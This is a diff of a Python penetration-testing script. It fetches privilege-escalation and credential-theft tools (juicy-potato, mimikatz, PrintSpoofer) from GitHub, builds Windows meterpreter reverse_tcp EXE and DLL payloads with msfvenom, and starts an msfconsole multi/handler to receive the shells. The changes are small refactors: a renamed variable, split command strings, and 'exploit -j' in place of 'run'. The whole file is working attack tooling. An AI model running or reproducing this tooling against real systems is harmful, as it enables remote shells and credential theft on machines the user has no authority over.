@@ -31,7 +31,7 @@ apps_to_download = ["https://github.com/ohpe/juicy-potato/releases/download/v0.1
 		"https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip",
 		"https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe"]
 
-file_types = ['exe', 'dll']
+windows_file_types = ['exe', 'dll']
 
 def powershell(script_url):
     header = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0'}
@@ -59,7 +59,12 @@ def download_powershell_scripts():
 def generate_reverse(ip, port, file_type):
     try:
         print("Creating rev.{}...".format(file_type))
-        os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -b {} -f {} > rev.{}".format(ip, port, r"\x00", file_type, file_type))
+        command = (
+            "msfvenom -p windows/x64/meterpreter/reverse_tcp "
+            "LHOST={} LPORT={} -b {} -f {} "
+            "> rev.{}".format(ip, port, r"\x00", file_type, file_type)
+        )
+        os.system(command)
     except Exception as err:
         print("\nError creating rev.{}: ".format(file_type) + str(err)) 
     finally:
@@ -67,7 +72,7 @@ def generate_reverse(ip, port, file_type):
 
 def reverse(ip, port):
     print("\n--- Creating windows/x64/meterpreter/reverse_tcp DLL and EXE ---")
-    for file_type in file_types:
+    for file_type in windows_file_types:
         generate_reverse(ip, port, file_type)
 
 def create_python_http(port):
@@ -83,7 +88,12 @@ def create_python_http(port):
 def create_multi_handler(ip, port):
     print("\n--- Creating multi/handler using MSFConsole ---")
     try:
-        os.system("qterminal -e 'msfconsole -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {}; set LPORT {}; set ExitOnSession false; run\"'".format(ip, port))
+        command = (
+            "qterminal -e 'msfconsole -x \"use exploit/multi/handler; "
+            "set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {}; "
+            "set LPORT {}; set ExitOnSession false; exploit -j\"'".format(ip, port)
+        )
+        os.system(command)
     except Exception as err:
         print("Error creating multi/handler: " + str(err))
     finally:
